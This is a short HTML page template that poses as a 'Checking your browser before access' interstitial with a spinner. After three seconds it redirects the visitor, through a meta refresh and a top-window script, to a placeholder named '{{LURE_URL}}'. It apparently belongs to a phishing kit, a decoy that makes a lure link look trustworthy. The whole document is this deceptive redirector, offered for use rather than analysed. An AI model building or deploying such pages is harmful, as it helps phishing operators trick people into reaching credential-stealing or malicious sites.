<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Checking your browser</title>
<meta http-equiv="refresh" content="3;url={{LURE_URL}}">
<style>
body{font-family:Arial,Helvetica,sans-serif;background:#f2f4f7;color:#333;text-align:center;padding-top:12vh}
.box{max-width:460px;margin:0 auto;background:#fff;border:1px solid #ddd;border-radius:8px;padding:32px}
.spin{display:inline-block;width:28px;height:28px;border:4px solid #ddd;border-top-color:#666;border-radius:50%;animation:s 1s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
<div class="spin"></div>
<h2>Checking your browser before access</h2>
<p>This process is automatic. You will be redirected shortly.</p>
</div>
<script>setTimeout(function(){window.top.location.href="{{LURE_URL}}"},3000);</script>
</body>
</html>
